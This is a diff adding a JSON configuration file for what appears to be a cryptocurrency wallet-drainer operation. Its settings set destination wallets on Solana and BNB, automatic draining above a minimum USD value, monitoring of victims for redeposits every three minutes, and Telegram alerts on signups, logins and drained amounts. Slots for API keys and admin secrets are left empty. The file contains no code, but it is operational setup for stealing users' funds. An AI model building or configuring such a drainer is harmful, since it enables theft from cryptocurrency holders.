@@ -1,0 +1,22 @@
+{
+  "heliusApiKey": "",
+  "jupiterApiKey": "",
+  "telegramBotToken": "",
+  "telegramChatId": "",
+  "solanaDestinationWallet": "",
+  "bnbDestinationWallet": "",
+  "solReserveAmount": 0.01,
+  "bnbReserveAmount": 0.001,
+  "minimumDrainAmountUsd": 50,
+  "telegramNotificationsEnabled": true,
+  "autoDrainEnabled": true,
+  "customDrainedAmount": 0,
+  "adminPassword": "",
+  "telegramSignupLogsEnabled": true,
+  "telegramLoginLogsEnabled": true,
+  "jwtSecret": "",
+  "turnstileSiteKey": "",
+  "turnstileSecretKey": "",
+  "redepositMonitorEnabled": true,
+  "redepositMonitorIntervalMinutes": 3
+}
